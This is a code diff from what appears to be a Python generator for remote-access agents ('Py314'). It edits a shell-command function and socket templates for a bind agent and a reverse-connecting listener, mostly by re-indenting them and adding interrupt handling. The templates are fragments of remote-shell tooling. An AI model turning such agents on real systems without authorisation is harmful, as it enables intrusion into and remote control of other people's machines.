@@ -359,7 +359,12 @@ def shellCommand(command, cwd):
 
 def ConnectPy314(ip, port):
     """Function to established a connection with Py314"""
-    {}
+
+    try: 
+        {}
+
+    except KeyboardInterrupt:
+        exit()
 
 # ------------------------------------------------------------------------------
 # ------------------------------------------------------------------------------
@@ -398,7 +403,8 @@ try:
 
 
 except KeyboardInterrupt:
-    channel.close()
+    if 'channel' in globals():
+        channel.close()
     exit()
     
     
@@ -432,44 +438,41 @@ def createSocket(agentType):
 
     if agentType == 'bind_agent':
         socket = f"""
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-    s.bind((ip, port))
-    s.listen(5)
+        s.bind((ip, port))
+        s.listen(5)
 
-    logging.info(f"Listening on {{ip}}:{{port}}")
+        logging.info(f"Listening on {{ip}}:{{port}}")
 
-    while True:
+        while True:
 
-        channel, cliAddress = s.accept()
-        logging.info(f"Received Connection from {{cliAddress[0]}}")
+            channel, cliAddress = s.accept()
+            logging.info(f"Received Connection from {{cliAddress[0]}}")
 
-        return channel
+            return channel
 
     """
 
 
     elif agentType == 'reverse_listener':
         socket = """
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-    logging.info(f"Trying to bind {ip}:{port}")
+        logging.info(f"Trying to bind {ip}:{port}")
 
-    while True:
+        while True:
 
-        try:
+            try:
 
-            s.connect((ip, port))
-            return s
+                s.connect((ip, port))
+                return s
 
-        except ConnectionError:
-            time.sleep(1)
-            pass
-
-
-
+            except ConnectionError:
+                time.sleep(1)
+                pass
     """
 
 
